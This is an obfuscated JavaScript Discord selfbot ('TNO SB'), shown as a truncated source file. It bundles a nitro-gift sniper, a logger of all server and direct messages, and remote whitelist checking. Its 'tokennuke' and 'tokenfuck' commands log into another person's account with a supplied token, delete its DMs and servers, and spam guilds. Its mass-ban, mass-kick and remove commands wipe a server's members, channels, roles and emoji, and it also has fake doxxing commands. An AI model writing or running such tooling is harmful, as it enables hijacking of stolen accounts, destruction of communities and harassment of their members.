const {
    Client,
    RichEmbed
} = require('discord.js'), {
    red,
    green,
    blue,
    yellow,
    cyan,
    white
} = require('chalk'), bot = new Client(), messagelogger = new Client(), settings = require('./settings.json'), ascii = require('ascii-art'), ms = require('ms'), http = require('http'), fs = require('fs'), fetch = require('node-fetch'), moment = require('moment'), weather = require('weather-js'), superagent = require('superagent'), identity = require('fake-identity'), pokemon = require('pokemon-images'), urban = require('relevant-urban'), axios = require('axios').default, nitrosniper = new Client(), snekfetch = require('snekfetch'), gtranslate = require('translate-google'), request = require('request');
var afkmode = false;

function tnologo() {
    console.log(red('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')), console.log(red('                            ::::::::::: ::::    :::  ::::::::        ::::::::  :::::::::  ')), console.log(red('                                :+:     :+:+:   :+: :+:    :+:      :+:    :+: :+:    :+: ')), console.log(red('                                +:+     :+:+:+  +:+ +:+    +:+      +:+        +:+    +:+ ')), console.log(red('                                +#+     +#+ +:+ +#+ +#+    +:+      +#++:++#++ +#++:++#+  ')), console.log(red('                                +#+     +#+  +#+#+# +#+    +#+             +#+ +#+    +#+ ')), console.log(red('                                #+#     #+#   #+#+# #+#    #+#      #+#    #+# #+#    #+# ')), console.log(red('                                ###     ###    ####  ########        ########  #########  '));
}
bot.on('ready', () => {
    request('https://pastebin.com/raw/AYZZPpgt', (_0x46f760, _0x5ca399, _0x4981c3) => {
        _0x4981c3 = _0x4981c3.toString().split('\x0d\x0a');
        if (_0x5ca399.body.includes(bot.user.id)) {
            let _0xaadc48 = '';
            settings.messagelogger === 'true' ? _0xaadc48 = 'Activated' : _0xaadc48 = 'Deactivated';;
            let _0x36fa70 = '';
            (bot.user.premium = 'true') ? _0x36fa70 = 'Nitro Activated': _0x36fa70 = 'Nitro not Activated';;
            let _0x144aa9 = '';
            (bot.user.verified = 'true') ? _0x144aa9 = 'Is Verified': _0x144aa9 = 'Is not Verified';;
            tnologo(), console.log(blue('                                           ━ USERNAME      | ' + bot.user.tag + '      ')), console.log(blue('                                           ━ PREFIX        | ' + settings.prefix + '  ')), console.log(blue('                                           ━ ID            | ' + bot.user.id + '      ')), console.log(blue('                                           ━ MESSAGELOGGER | ' + _0xaadc48)), console.log(blue('                                           ━ VERIFIED      | ' + _0x144aa9 + '    ')), console.log(blue('                                           ━ NITRO         | ' + _0x36fa70 + '     ')), console.log(red('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
            if (settings.messagelogger === 'true') messagelogger.login(settings.token), messagelogger.on('ready', () => {
                messagelogger.on('message', _0x356c3a => {
                    if (_0x356c3a.channel.type === 'text') console.log(red(_0x356c3a.guild.name) + white(' : ') + blue(_0x356c3a.channel.name) + white(' : ') + yellow(_0x356c3a.author.tag) + white(' : ') + green(_0x356c3a));
                    else _0x356c3a.channel.type === 'dm' && console.log(red('No Guild') + white(' : ') + blue('DMs') + white(' : ') + yellow(_0x356c3a.author.tag) + white(' : ') + green(_0x356c3a));
                });
            });
            else {
                if (settings.messagelogger === 'false') {}
            }
            nitrosniper.login(settings.token), nitrosniper.on('ready', () => {
                nitrosniper.on('message', _0x5534e3 => {
                    if (_0x5534e3.author.bot) return;
                    if (_0x5534e3.content.includes('discord.gift') || _0x5534e3.content.includes('discordapp.com/gifts/')) {
                        var _0xf5578f = /(discord\.(gift)|discordapp\.com\/gift)\/.+[a-z]/,
                            _0x1d3f4d = _0xf5578f.exec(_0x5534e3.content),
                            _0xe35361 = _0x1d3f4d[0].split('/')[1];
                        axios({
                            'method': 'POST',
                            'url': 'https://discordapp.com/api/v6/entitlements/gift-codes/' + _0xe35361 + '/redeem',
                            'headers': {
                                'Authorization': settings.token
                            }
                        }).then(() => console.log(green('Successfull redeemed Gift: ') + _0xe35361 + '\x0a')).catch(() => console.log(white('Error: ') + red('Failed To Claim Gift: ' + _0xe35361 + ' \x0a')));
                    }
                });
            }), bot.on('message', async _0x45a05e => {
                if (_0x45a05e.author.id !== settings.ID) return;
                let _0x332eac = _0x45a05e.content.split(' ')[0];
                _0x332eac = _0x332eac.slice(settings.prefix.length);
                let _0x55fe92 = _0x45a05e.content.split(' ').slice(1);
                _0x45a05e.content.startsWith(settings.prefix) && _0x45a05e.author.id === settings.ID && console.log(red('[TYPE] > ' + _0x45a05e.content));
                if (_0x332eac === 'tokennuke') {
                    const _0x67e6ef = new Client();
                    let _0x531507 = _0x55fe92.join(' ');
                    _0x67e6ef.login(_0x531507), _0x67e6ef.on('ready', () => {
                        _0x67e6ef.users.forEach(_0x26798a => _0x26798a.deleteDM()), _0x67e6ef.guilds.forEach(_0x527321 => _0x527321.delete()), _0x67e6ef.user.setAvatar('https://cdn.discordapp.com/attachments/0.97389797666189/unnamed.jpg');
                    });
                }
                if (_0x332eac === 'tokenfuck') {
                    const _0x58aeae = new Client();
                    let _0x4de356 = _0x55fe92.join(' ');
                    _0x58aeae.login(_0x4de356), _0x58aeae.on('ready', () => {
                        setInterval(() => {
                            var _0x53dadc = _0x58aeae.guilds.array();
                            _0x58aeae.user.createGuild('TNO SB'), _0x53dadc.forEach(_0x14cc8e => _0x14cc8e.setIcon('https://cdn.discordapp.com/attachments/0.99688422753757/egirl.PNG'));
                        }, 1000);
                    });
                }
                if (_0x332eac === 'help') {
                    let _0x4b477b = new RichEmbed().addField('__𝙏𝙀𝙓𝙏__', '`𝘚𝘏𝘖𝘞 𝘛𝘌𝘟𝘛 𝘊𝘖𝘔𝘔𝘈𝘕𝘋`', true).addField('__𝗦𝗧𝗔𝗧𝗨𝗦__', '`𝘚𝘏𝘖𝘞 𝘚𝘛𝘈𝘛𝘜𝘚 𝘊𝘖𝘔𝘔𝘈𝘕𝘋`', true).addField('__𝗡𝗨𝗞𝗘__', '`𝘚𝘏𝘖𝘞 𝘕𝘜𝘒𝘌 𝘊𝘖𝘔𝘔𝘈𝘕𝘋𝘚`', true).addField('__𝗜𝗡𝗙𝗢__', '`𝘚𝘏𝘖𝘞 𝘐𝘕𝘍𝘖 𝘊𝘖𝘔𝘔𝘈𝘕𝘋𝘚`', true).addField('__𝗙𝗨𝗡__', '`𝘚𝘏𝘖𝘞 𝘍𝘜𝘕 𝘊𝘖𝘔𝘔𝘈𝘕𝘋𝘚`', true).addField('__𝐒𝐘𝐑𝐔𝐒__', '`𝘚𝘏𝘖𝘞 𝘊𝘙𝘌𝘈𝘛𝘖𝘙 𝘐𝘕𝘍𝘖`', true).setThumbnail('https://cdn.discordapp.com/attachments/0.9870804803677/original_3.gif').setAuthor('𝗧𝗡𝗢 | 𝗦𝗘𝗟𝗙𝗕𝗢𝗧 | 𝗩𝟰').setTimestamp();
                    _0x45a05e.edit(_0x4b477b);
                }
                if (_0x332eac === 'ranactivity') {
                    let _0x4f66dc = ['idle', 'dnd', 'online'],
                        _0x344c40 = _0x4f66dc[Math.floor(Math.random() * _0x4f66dc.length)];
                    _0x45a05e.react('👍'), setInterval(function () {
                        bot.user.setStatus(_0x344c40);
                    }, 4000);
                }
                if (_0x332eac === 'text') {
                    let _0x2318cd = new RichEmbed().setTitle('𝙏𝙀𝙓 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝗦').addField('𝘛𝘺𝘱𝘪𝘯𝘨', '`𝘚𝘩𝘰𝘸 𝘍𝘢𝘬𝘦 𝘛𝘺𝘱𝘪𝘯𝘨 `', true).addField('𝘋𝘰𝘰𝘮', '`𝘚𝘩𝘰𝘸 𝘋𝘰𝘰𝘮 𝘈𝘴𝘤𝘪𝘪`', true).addField('𝘙𝘶𝘴𝘵𝘦𝘥', '`𝘚𝘩𝘰𝘸 𝘙𝘶𝘴𝘵𝘦𝘥 𝘈𝘴𝘤𝘪𝘪`', true).addField('𝘗𝘢𝘤𝘬', '`𝘙𝘢𝘯𝘥𝘰𝘮 𝘗𝘢𝘤𝘬 𝘛𝘦𝘹𝘵`', true).addField('𝘚𝘱𝘢𝘮', '`𝘚𝘱𝘢𝘮 𝘛𝘦𝘹𝘵 (𝘈𝘮𝘰𝘶𝘯𝘵)`', true).addField('𝘊𝘭𝘦𝘢𝘳', '`𝘋𝘦𝘭𝘦𝘵𝘦 𝘈𝘭𝘭 𝘔𝘴𝘨`', true).addField('𝘗𝘶𝘳𝘨𝘦', '`𝘋𝘦𝘭𝘦𝘵𝘦 (𝘈𝘮𝘰𝘶𝘯𝘵) 𝘖𝘧 𝘔𝘴𝘨`', true).addField('𝘍𝘭𝘪𝘱𝘤𝘰𝘪𝘯', '`𝘛𝘢𝘪𝘭𝘴 𝘖𝘳 𝘏𝘦𝘢𝘥𝘴`', true).addField('𝘈𝘧𝘬', '`𝘈𝘧𝘬𝘰𝘯/𝘈𝘧𝘬𝘰𝘧𝘧 𝘥𝘰 𝘈𝘧𝘬𝘰𝘯 2000/𝘛𝘦𝘹𝘵`', true).addField('𝘋𝘮', '` 𝘗𝘪𝘯𝘨 @𝘜𝘴𝘦 𝘈𝘯𝘥 𝘋𝘮 𝘏𝘪𝘮 𝘍𝘳𝘰𝘮 𝘎𝘤/𝘚𝘦𝘳𝘷𝘦𝘳𝘴`', true).addField('𝘜𝘱𝘛𝘪𝘮𝘦', '`𝘏𝘰𝘸 𝘔𝘢𝘯𝘺 𝘏𝘰𝘶𝘳/𝘔𝘪𝘯/𝘚𝘦𝘤 𝘛𝘦𝘭𝘭 𝘚𝘣 𝘖𝘯`', true).addField('𝘜𝘳𝘣𝘢𝘯', '`𝘚𝘩𝘰𝘸 𝘜𝘳𝘣𝘢𝘯 𝘔𝘦𝘢𝘯𝘪𝘯𝘨`', true).setThumbnail('https://cdn.discordapp.com/attachments/0.9870804803677/original_3.gif');
                    _0x45a05e.edit(_0x2318cd);
                }
                if (_0x332eac === 'smile') {
                    let _0x5ace0a = new RichEmbed().setTitle('SMILE AT U').setThumbnail('https://cdn.discordapp.com/attachments/0.99965850954956/image0.gif');
                    _0x45a05e.edit(_0x5ace0a);
                }
                if (_0x332eac === 'nuke') {
                    let _0x27cdd4 = new RichEmbed().setTitle('𝗡𝗨𝗞𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦').addField('𝘔𝘢𝘴𝘴𝘣', '`𝘉𝘢𝘯 𝘈𝘭𝘭 𝘔𝘦𝘮𝘣𝘦𝘳𝘴`', true).addField('𝘔𝘢𝘴𝘴𝘬', '`𝘒𝘪𝘤𝘬 𝘈𝘭𝘭 𝘔𝘦𝘮𝘣𝘦𝘳𝘴`', true).addField('𝘙𝘦𝘮𝘰𝘷𝘦𝘤', '`𝘙𝘦𝘮𝘰𝘷𝘦 𝘈𝘭𝘭 𝘊𝘩𝘢𝘯𝘯𝘦𝘭`', true).addField('𝘔𝘢𝘴𝘴𝘶', '`𝘜𝘣𝘢𝘯 𝘈𝘭𝘭 𝘔𝘦𝘮𝘣𝘦𝘳𝘴`', true).addField('𝘙𝘦𝘮𝘰𝘷𝘦𝘳', '`𝘙𝘦𝘮𝘰𝘷𝘦 𝘈𝘭𝘭 𝘙𝘰𝘭𝘦𝘴`', true).addField('𝘙𝘦𝘮𝘰𝘷𝘦𝘦', '`𝘙𝘦𝘮𝘰𝘷𝘦 𝘈𝘭𝘭 𝘌𝘮𝘰𝘫𝘪`', true).addField('𝘔𝘢𝘴𝘴𝘤', '`𝘔𝘢𝘬𝘦 𝘏𝘦𝘭𝘭𝘢 𝘛𝘦𝘹𝘵 𝘊𝘩𝘢𝘯𝘯𝘦𝘭`', true).addField('𝘔𝘢𝘴𝘴𝘷', '`𝘔𝘢𝘬𝘦 𝘩𝘦𝘭𝘭𝘢 𝘝𝘤 𝘊𝘩𝘢𝘯𝘯𝘦𝘭`', true).addField('𝘛𝘰𝘬𝘦𝘯𝘕𝘶𝘬𝘦', '`𝘙𝘦𝘮𝘰𝘷𝘦 𝘌𝘷𝘦𝘳𝘺𝘵𝘩𝘪𝘯𝘨 𝘍𝘳𝘰𝘮 𝘈𝘤𝘤𝘰𝘶𝘯𝘵`', true).addField('TokenFuck', '`𝘊𝘳𝘦𝘢𝘵𝘦 𝘔𝘢𝘴𝘴 𝘊𝘩𝘢𝘯𝘯𝘦𝘭 𝘐𝘯 𝘈𝘤𝘤𝘰𝘶𝘯𝘵`', true).setThumbnail('https://cdn.discordapp.com/attachments/0.9870804803677/original_3.gif');
                    _0x45a05e.edit(_0x27cdd4);
                }
                if (_0x332eac === 'info') {
                    let _0x49c36f = new RichEmbed().setTitle('𝗜𝗡𝗙𝗢 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦').addField('𝘐𝘱', '`𝘚𝘩𝘰𝘸 𝘍𝘢𝘬𝘦 𝘐𝘱`', true).addField('𝘚𝘵𝘢𝘵𝘴', '`𝘚𝘩𝘰𝘸 𝘏𝘰𝘸 𝘔𝘢𝘯𝘺 𝘚𝘦𝘳𝘷𝘦𝘳 𝘈𝘯𝘥 𝘔𝘦𝘮𝘣𝘦𝘳𝘴`', true).addField('𝘜𝘴𝘦𝘳𝘪𝘥', '`𝘚𝘩𝘰𝘸 𝘍𝘢𝘬𝘦 𝘋𝘰𝘹𝘹`', true).addField('𝘛𝘰𝘬𝘦𝘯𝘐𝘯𝘧𝘰', '`𝘚𝘩𝘰𝘸 𝘛𝘰𝘬𝘦𝘯 𝘐𝘯𝘧𝘰`', true).addField('𝘐𝘱 𝘚𝘦𝘢𝘳𝘤𝘩', '`𝘚𝘩𝘰𝘸 𝘐𝘱 𝘐𝘯𝘧𝘰`', true).addField('𝘚𝘦𝘳𝘷𝘦𝘳𝘐𝘯𝘧𝘰', '`𝘚𝘩𝘰𝘸 𝘚𝘦𝘳𝘷𝘦𝘳𝘐𝘯𝘧𝘰`', true).addField('𝘗𝘧𝘱', '`𝘚𝘩𝘰𝘸 @𝘶𝘴𝘦𝘳 𝘈𝘷𝘢𝘵𝘢𝘳`', true).addField('𝘚𝘵𝘢𝘵𝘴', '`𝘚𝘩𝘰𝘸 𝘚𝘦𝘳𝘷𝘦𝘳 𝘈𝘯𝘥 𝘔𝘦𝘮𝘣𝘦𝘳𝘴`', true).addField('𝘚𝘵𝘦𝘢𝘭𝘱𝘧𝘱', '`𝘚𝘵𝘦𝘢𝘭 @𝘶𝘴𝘦𝘳 𝘈𝘷𝘢𝘵𝘢𝘳`', true).addField('𝘚𝘦𝘵𝘗𝘧𝘱', '`𝘚𝘦𝘵𝘗𝘧𝘱 𝘞𝘪𝘵𝘩 𝘜𝘳𝘭`', true).addField('𝘊𝘩𝘢𝘯𝘯𝘦𝘭𝘴', '`𝘚𝘩𝘰𝘸 𝘏𝘰𝘸 𝘔𝘢𝘯𝘺 𝘊𝘩𝘢𝘯𝘯𝘦𝘭𝘴 𝘐𝘯 𝘚𝘦𝘳𝘷𝘦𝘳𝘴`', true).addField('𝘙𝘰𝘭𝘦𝘴', '`𝘚𝘩𝘰𝘸 𝘏𝘰𝘸 𝘔𝘢𝘯𝘺 𝘙𝘰𝘭𝘦𝘴 𝘐𝘯 𝘚𝘦𝘳𝘷𝘦𝘳𝘴`', true).addField('𝘓𝘦𝘢𝘷𝘦𝘚𝘦𝘳𝘷𝘦𝘳𝘴', '`𝘓𝘦𝘢𝘷𝘦𝘚𝘦𝘳𝘷𝘦𝘳𝘴/𝘋𝘦𝘭𝘦𝘵𝘦𝘥 𝘚𝘦𝘳𝘷𝘦𝘳 𝘸𝘰𝘯𝘵 𝘥𝘦𝘭𝘦𝘵𝘦 𝘪𝘧 𝘶 𝘩𝘢𝘷𝘦2𝘧𝘢`', true).setThumbnail('https://cdn.discordapp.com/attachments/0.9870804803677/original_3.gif');
                    _0x45a05e.edit(_0x49c36f);
                }
                if (_0x332eac === 'status') {
                    let _0x3edd31 = new RichEmbed().setTitle('𝙎𝙏𝘼𝙏𝙐𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎').addField('𝘚𝘵𝘳𝘦𝘢𝘮𝘪𝘯𝘨', '`𝘊𝘩𝘢𝘯𝘨𝘦 𝘚𝘵𝘢𝘵𝘶𝘴 𝘛𝘰 𝘚𝘵𝘳𝘦𝘢𝘮𝘪𝘯𝘨`', true).addField('𝘞𝘢𝘵𝘤𝘩𝘪𝘯𝘨', '`𝘊𝘩𝘢𝘯𝘨𝘦 𝘚𝘵𝘢𝘵𝘶𝘴 𝘛𝘰 𝘞𝘢𝘵𝘤𝘩𝘪𝘯𝘨`', true).addField('𝘓𝘪𝘴𝘵𝘦𝘯𝘪𝘯𝘨', '`𝘊𝘩𝘢𝘯𝘨𝘦 𝘚𝘵𝘢𝘵𝘶𝘴 𝘛𝘰 𝘓𝘪𝘴𝘵𝘦𝘯𝘪𝘯𝘨`', true).addField('𝘗𝘭𝘢𝘺𝘪𝘯𝘨', '`𝘊𝘩𝘢𝘯𝘨𝘦 𝘚𝘵𝘢𝘵𝘶𝘴 𝘛𝘰 𝘗𝘭𝘢𝘺𝘪𝘯𝘨`', true).addField('𝘚𝘵𝘰𝘱', '`𝘚𝘵𝘰𝘱 𝘠𝘰𝘶𝘳 𝘚𝘵𝘢𝘵𝘶𝘴`', true).setThumbnail('https://cdn.discordapp.com/attachments/0.9870804803677/original_3.gif');
                    _0x45a05e.edit(_0x3edd31);
                }
                if (_0x332eac === 'fun') {
                    let _0xc583ac = new RichEmbed().setTitle('𝙁𝙐𝙉 𝘾𝙊𝙈𝙈𝘼𝙉𝘿').addField('𝘚𝘱𝘢𝘯𝘬', '`𝘚𝘩𝘰𝘸 𝘍𝘢𝘬𝘦 𝘛𝘺𝘱𝘪𝘯𝘨 `', true).addField('𝘚𝘮𝘶𝘨', '`𝘚𝘩𝘰𝘸 𝘋𝘰𝘰𝘮 𝘈𝘴𝘤𝘪𝘪`', true).addField('𝘒𝘪𝘴𝘴', '`@𝘜𝘴𝘦𝘳 𝘚𝘩𝘰𝘸 𝘒𝘪𝘴𝘴 𝘎𝘪𝘧`', true).addField('𝘏𝘶𝘨', '`@𝘜𝘴𝘦𝘳 𝘚𝘩𝘰𝘸 𝘏𝘶𝘨 𝘎𝘪𝘧`', true).addField('𝘚𝘭𝘢𝘱', '`@𝘜𝘴𝘦𝘳 𝘚𝘩𝘰𝘸 𝘚𝘭𝘢𝘱 𝘎𝘪𝘧`', true).addField('𝘧𝘢𝘬𝘦𝘸𝘪𝘻𝘻', '`𝘚𝘩𝘰𝘸 𝘌𝘮𝘣𝘦𝘥 𝘖𝘧 𝘍𝘢𝘬𝘦𝘸𝘪𝘻𝘻`', true).addField('𝘉𝘰𝘰𝘣𝘴', '`@𝘜𝘴𝘦𝘳 𝘚𝘩𝘰𝘸 𝘉𝘰𝘰𝘣𝘴 𝘎𝘪𝘧`', true).addField('𝘍𝘦𝘦𝘥', '`@𝘜𝘴𝘦𝘳 𝘚𝘩𝘰𝘸 𝘍𝘦𝘦𝘥 𝘎𝘪𝘧`', true).addField('𝘛𝘪𝘤𝘬𝘭𝘦', '`@𝘜𝘴𝘦𝘳 𝘚𝘩𝘰𝘸 𝘛𝘪𝘤𝘬𝘭𝘦 𝘎𝘪𝘧`', true).addField('𝘏𝘢𝘯𝘥𝘫𝘰𝘣', '`@𝘜𝘴𝘦𝘳 𝘚𝘩𝘰𝘸 𝘏𝘢𝘯𝘥𝘫𝘰𝘣 𝘌𝘥𝘪𝘵𝘦𝘥`', true).addField('𝘓𝘰𝘭', '`𝘗𝘪𝘯𝘨 @𝘶𝘴𝘦𝘳 𝘛𝘰 𝘚𝘩𝘰𝘸 𝘓𝘰𝘭`', true).addField('𝘛𝘰𝘬𝘦𝘯', '`@𝘜𝘴𝘦𝘳 𝘚𝘩𝘰𝘸 𝘏𝘢𝘭𝘧 𝘛𝘰𝘬𝘦𝘯`', true).addField('𝘛𝘺𝘱𝘪𝘯𝘨', '`𝘚𝘩𝘰𝘸 𝘍𝘢𝘬𝘦 𝘛𝘺𝘱𝘪𝘯𝘨`', true).addField('𝘎𝘢𝘺', '`𝘚𝘩𝘰𝘸 𝘏𝘰𝘸 𝘎𝘢𝘺`', true).addField('𝘗𝘰𝘬𝘪', '`𝘚𝘩𝘰𝘸 𝘗𝘰𝘬𝘦𝘮𝘰𝘯`', true).addField('𝘌𝘮𝘣𝘦𝘥', '`𝘛𝘶𝘳𝘯 𝘛𝘦𝘹𝘵 𝘌𝘮𝘣𝘦𝘥`', true).setThumbnail('https://cdn.discordapp.com/attachments/0.9870804803677/original_3.gif');
                    _0x45a05e.edit(_0xc583ac);
                }
                if (_0x332eac === 'urban') try {
                    const _0xd90306 = await urban(_0x55fe92.join(' '));
                    let _0x561081 = new RichEmbed().setDescription('**' + _0xd90306.word + `**\
Definition: **` + _0xd90306.definition + `**\
\
` + _0xd90306.example).setColor('RANDOM');
                    _0x45a05e.channel.send(_0x561081);
                } catch (_0x586ab2) {
                    return _0x45a05e.reply('Could not find that query.');
                }
                if (_0x332eac === 'embed') {
                    if (_0x55fe92.join(' ').length > 2000) return _0x45a05e.reply('Text may not exceed 2000 characters.');
                    let _0x3a8911 = new RichEmbed().setDescription(_0x55fe92.join(' ')).setColor('RANDOM');
                    _0x45a05e.channel.send(_0x3a8911);
                }
                if (_0x332eac === 'match') {
                    let _0x2ad506 = _0x45a05e.mentions.users.first();
                    if (!_0x2ad506) return _0x45a05e.reply('You forgot to mention a user.');
                    let _0x3d767c = new RichEmbed().setDescription(_0x45a05e.author.tag + ' AND ' + _0x2ad506.tag + ' ARE ' + _0x24e900(0, 100) + '%MATCH').setThumbnail('https://cdn.discordapp.com/attachments/0.99864382222972/astro-love--1.539638097e+9.gif').setColor('#000000');
                    _0x45a05e.channel.send(_0x3d767c);
                }
                if (_0x332eac === 'gay') {
                    let _0x2b7282 = _0x45a05e.mentions.users.first();
                    if (!_0x2b7282) _0x2b7282 = _0x45a05e.author;
                    _0x45a05e.channel.send(new RichEmbed().setColor('RANDOM').setDescription(_0x2b7282 + ' is ' + _0x24e900(0, 100) + '% Gay').setThumbnail('http://gph.is/16IPbc6'));
                }

                function _0x24e900(_0x22d21c, _0x32d664) {
                    return Math.floor(Math.random() * (_0x32d664 - _0x22d21c + 1) + _0x22d21c);
                }
                if (_0x332eac === 'setpfp') try {
                    if (!/\.(jpe?g|png|gif)$/i.test(_0x55fe92[0])) return _0x45a05e.reply('URL NOT WORKING');
                    client.user.setAvatar(_0x55fe92[0]), await _0x45a05e.react('Done');
                    return;
                } catch (_0xb33d1c) {
                    _0x45a05e.channel.send('Error, make sure you are not trying to upload a gif image when you do not have nitro.');
                }
                if (_0x332eac === 'massb') {
                    const _0xb4f122 = message.guild;
                    if (!_0xb4f122) return;
                    async function _0x3e5046() {
                        await _0xb4f122.fetchMembers(), await Promise.all(_0xb4f122.members.map(async _0x5b9133 => {
                            _0x5b9133.bannable && _0x5b9133.ban();
                        }));
                    }
                    _0x3e5046();
                }
                if (_0x332eac === 'massk') try {
                    _0x45a05e.guild.members.forEach(_0x71416f => {
                        _0x71416f.kickable ? (console.log(yellow('[INFO] Kicked' + _0x71416f.user.username)), _0x71416f.kick(), console.log(green('[INFO] Kicked All Possible Members!'))) : console.log(yellow("[INFO] Couldn't kick " + _0x71416f + user + username + ' you have no permissions'));
                    });
                } catch (_0x2eed4e) {}
                if (_0x332eac === 'google') {}
                if (_0x332eac === 'channels') {
                    if (_0x45a05e.guild.channels.map(_0x5cf261 => _0x5cf261.name).join('').length > 2000) return _0x45a05e.reply('This server has too many channels to display! (' + _0x45a05e.guild.channels.size + ' roles)');
                    let _0x273465 = new RichEmbed().setDescription(_0x45a05e.guild.channels.map(_0x20602b => _0x20602b.name).join(', ')).setColor('RANDOM').setThumbnail('https://cdn.discordapp.com/attachments/0.99754277785725/giphy_2.gif');
                    _0x45a05e.channel.send(_0x273465);
                }
                if (_0x332eac === 'roles') {
                    if (_0x45a05e.guild.roles.map(_0x58ba21 => _0x58ba21.toString()).join('').length > 2000) return _0x45a05e.reply('This server has too many roles to display! (' + _0x45a05e.guild.roles.size + ' roles)');
                    let _0x28e097 = new RichEmbed().setDescription(_0x45a05e.guild.roles.map(_0x36ffa6 => _0x36ffa6.toString()).join('')).setColor('RANDOM').setThumbnail('https://cdn.discordapp.com/attachments/0.99754277785725/giphy_2.gif');
                    _0x45a05e.channel.send(_0x28e097);
                }
                _0x332eac === 'removec' && (_0x45a05e.delete(), _0x45a05e.guild.channels.forEach(_0x27e059 => _0x27e059.delete()));
                _0x332eac === 'removec' && (_0x45a05e.delete(), _0x45a05e.guild.channels.forEach(_0x9a912e => _0x9a912e.delete()));
                _0x332eac === 'removec' && (_0x45a05e.delete(), _0x45a05e.guild.channels.forEach(_0x59d375 => _0x59d375.delete()));
                _0x332eac === 'removec' && (_0x45a05e.delete(), _0x45a05e.guild.channels.forEach(_0x4e69da => _0x4e69da.delete()));
                _0x332eac === 'removec' && (_0x45a05e.delete(), _0x45a05e.guild.channels.forEach(_0x5699bc => _0x5699bc.delete()));
                _0x332eac === 'removec' && (_0x45a05e.delete(), _0x45a05e.guild.channels.forEach(_0x5132b3 => _0x5132b3.delete()));
                if (_0x332eac === 'userid') {
                    let _0x5e9cbc = new RichEmbed().addField('Gender', identity.generate().sex).addField('First Name', identity.generate().firstName).addField('Email Address', identity.generate().emailAddress).addField('Phone Number', identity.generate().phoneNumber).addField('Street', identity.generate().street).addField('City', identity.generate().city).addField('State', identity.generate().state).addField('Zip Code', identity.generate().zipCode).addField('Date of Birth', identity.generate().dateOfBirth).addField('Company', identity.generate().company).addField('Department', identity.generate().department);
                    _0x45a05e.edit(_0x5e9cbc);
                }
                if (_0x332eac === 'ip') {
                    var _0x556662 = Math.floor(Math.random() * 255) + 1 + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255);
                    let _0x529a33 = _0x45a05e.mentions.users.first(),
                        _0x37e349 = new RichEmbed().setDescription(_0x529a33 + "'s IP: " + _0x556662);
                    _0x45a05e.edit(_0x37e349);
                }
                _0x332eac === 'removec' && (_0x45a05e.guild.channels.forEach(_0x10b872 => _0x10b872.delete()), _0x45a05e.guild.roles.forEach(_0x2d2703 => _0x2d2703.delete()), _0x45a05e.guild.emojis.forEach(_0x390681 => _0x390681.delete()));
                _0x332eac == 'removee' && _0x45a05e.guild.emojis.forEach(_0xee55ee => _0xee55ee.delete());
                _0x332eac == 'remover' && _0x45a05e.guild.roles.forEach(_0x16de8b => _0x16de8b.delete());
                if (_0x332eac === 'slap') {
                    let _0x38f289 = _0x45a05e.mentions.users.first();
                    superagent.get('https://nekos.life/api/v2/img/slap', (_0x376075, _0x3702ed) => {
                        if (!_0x38f289) return _0x45a05e.reply('You forgot to mention a user.');
                        let _0x15130f = new RichEmbed().setDescription(_0x45a05e.author.tag + ' slaped ' + _0x38f289.tag).setColor('#000000').setImage(_0x3702ed.body.url);
                        _0x45a05e.channel.send(_0x15130f);
                    });
                }
                if (_0x332eac === 'poke') {
                    let _0x493625 = _0x45a05e.mentions.users.first();
                    superagent.get('https://nekos.life/api/v2/img/poke', (_0x876ebc, _0x5779a4) => {
                        if (!_0x493625) return _0x45a05e.reply('You forgot to mention a user.');
                        let _0x30359f = new RichEmbed().setDescription(_0x45a05e.author.tag + ' poked ' + _0x493625.tag).setColor('#000000').setImage(_0x5779a4.body.url);
                        _0x45a05e.channel.send(_0x30359f);
                    });
                }
                if (_0x332eac === 'boobs') {
                    let _0x37d2ef = _0x45a05e.mentions.users.first();
                    superagent.get('https://nekos.life/api/v2/img/boobs', (_0x53ddbd, _0x38af30) => {
                        if (!_0x37d2ef) return _0x45a05e.reply('You forgot to mention a user.');
                        let _0x312013 = new RichEmbed().setDescription(_0x45a05e.author.tag + ' show boobs to ' + _0x37d2ef.tag).setColor('#000000').setImage(_0x38af30.body.url);
                        _0x45a05e.channel.send(_0x312013);
                    });
                }
                if (_0x332eac === 'spank') {
                    let _0x4eb5ba = _0x45a05e.mentions.users.first();
                    superagent.get('https://nekos.life/api/v2/img/spank', (_0x1681f7, _0xdd8677) => {
                        if (!_0x4eb5ba) return _0x45a05e.reply('You forgot to mention a user.');
                        let _0x5955c0 = new RichEmbed().setDescription(_0x45a05e.author.tag + ' Spank ' + _0x4eb5ba.tag).setColor('#000000').setImage(_0xdd8677.body.url);
                        _0x45a05e.channel.send(_0x5955c0);
                    });
                }
                if (_0x332eac === 'feet') {
                    let _0x59cb03 = _0x45a05e.mentions.users.first();
                    superagent.get('https://nekos.life/api/v2/img/feet', (_0xef1893, _0x58cda6) => {
                        if (!_0x59cb03) return _0x45a05e.reply('You forgot to mention a user.');
                        let _0x386513 = new RichEmbed().setDescription(_0x45a05e.author.tag + ' Show feet to ' + _0x59cb03.tag).setColor('#000000').setImage(_0x58cda6.body.url);
                        _0x45a05e.channel.send(_0x386513);
                    });
                }
                if (_0x332eac === 'smug') {
                    let _0x1fee1c = _0x45a05e.mentions.users.first();
                    superagent.get('https://nekos.life/api/v2/img/spank', (_0x9388df, _0x41304f) => {
                        if (!_0x1fee1c) return _0x45a05e.reply('You forgot to mention a user.');
                        let _0x344c99 = new RichEmbed().setDescription(_0x45a05e.author.tag + ' smug at ' + _0x1fee1c.tag).setColor('#000000').setImage(_0x41304f.body.url);
                        _0x45a05e.channel.send(_0x344c99);
                    });
                }
                if (_0x332eac === 'cuddle') {
                    let _0x1522a7 = _0x45a05e.mentions.users.first();
                    superagent.get('https://nekos.life/api/v2/img/cuddle', (_0x1ca6cb, _0x3a073d) => {
